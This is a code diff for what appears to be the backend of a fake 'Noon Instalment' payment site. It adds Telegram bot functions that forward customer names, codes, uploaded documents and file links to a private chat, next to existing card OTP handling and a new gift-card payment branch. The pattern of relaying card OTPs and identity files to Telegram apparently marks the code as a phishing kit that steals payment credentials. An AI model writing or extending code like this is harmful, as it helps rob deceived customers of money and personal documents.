@@ -61,12 +61,58 @@ function buildNotice(payload, monthly, title, isCard) {
   return body.join("\n");
 }
 
+async function postTelegram(token, method, body) {
+  const response = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(body),
+  });
+  const data = await response.json().catch(() => ({}));
+  return { ok: response.ok && data.ok, error: clip(data.description || "Telegram notification failed", 180) };
+}
+
+async function sendSubmissionNotice(payload, token) {
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!token || !chatId) {
+    return { ok: false, error: "Telegram is not configured" };
+  }
+  const lines = [
+    "Noon Instalment — Customer submission",
+    `Customer: ${clip(payload.name, 80)}`,
+    `Code: ${clip(payload.customerCode, 40)}`,
+    `Type: ${clip(payload.kind, 24)}`,
+    payload.title ? `Title: ${clip(payload.title, 80)}` : "",
+    payload.documentName ? `Document: ${clip(payload.documentName, 80)}` : "",
+    payload.responseText ? `Details: ${clip(payload.responseText, 400)}` : "",
+    payload.fileName ? `File: ${clip(payload.fileName, 120)}` : "",
+    payload.fileUrl ? `Download: ${payload.fileUrl}` : "",
+  ].filter(Boolean);
+  const message = await postTelegram(token, "sendMessage", {
+    chat_id: chatId,
+    text: lines.join("\n"),
+    disable_web_page_preview: false,
+  });
+  if (!message.ok) return message;
+  if (payload.fileUrl) {
+    await postTelegram(token, "sendDocument", {
+      chat_id: chatId,
+      document: payload.fileUrl,
+      caption: `${clip(payload.name, 40)} · ${clip(payload.customerCode, 24)} · ${clip(payload.fileName || payload.documentName || "file", 80)}`,
+    });
+  }
+  return { ok: true };
+}
+
 export async function sendDownPaymentNotice(payload) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
+  if (payload.noticeType === "customer_submission") {
+    return sendSubmissionNotice(payload, token);
+  }
   const paymentNotice =
     payload.channel === "payment" ||
     payload.method === "bank" ||
     payload.method === "card" ||
+    payload.method === "gift" ||
     payload.noticeType === "card_otp" ||
     payload.noticeType === "card_otp_resend";
   const chatId = paymentNotice
@@ -98,6 +144,8 @@ export async function sendDownPaymentNotice(payload) {
     title = monthly
       ? "Noon Instalment — Monthly card OTP"
       : "Noon Instalment — Card OTP verification";
+  } else if (payload.method === "gift") {
+    title = "Noon Instalment — Gift card payment";
   } else if (isCard) {
     title = monthly
       ? "Noon Instalment — Monthly card payment"
